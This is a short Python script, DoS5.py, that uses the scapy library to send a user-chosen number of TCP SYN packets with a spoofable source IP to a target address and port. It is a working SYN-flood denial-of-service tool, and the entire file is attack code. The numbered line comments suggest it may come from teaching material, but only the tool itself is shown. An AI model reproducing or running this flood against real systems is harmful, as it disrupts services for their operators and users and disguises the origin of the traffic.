#!/usr/bin/env python

### DoS5.py

import sys, socket
from scapy.all import *

if len(sys.argv) != 5:
   print "Usage>>>:   %s  source_IP  dest_IP  dest_port  how_many_packets" % sys.argv[0]
   sys.exit(1)

srcIP    = sys.argv[1]                                                       #(1)
destIP   = sys.argv[2]                                                       #(2)
destPort = int(sys.argv[3])                                                  #(3)
count    = int(sys.argv[4])                                                  #(4)

for i in range(count):                                                       #(5)
    IP_header = IP(src = srcIP, dst = destIP)                                #(6)
    TCP_header = TCP(flags = "S", sport = RandShort(), dport = destPort)     #(7)
    packet = IP_header / TCP_header                                          #(8)
    try:                                                                     #(9)
       send(packet)                                                          #(10)
    except Exception as e:                                                   #(11)
       print e                                                               #(11)

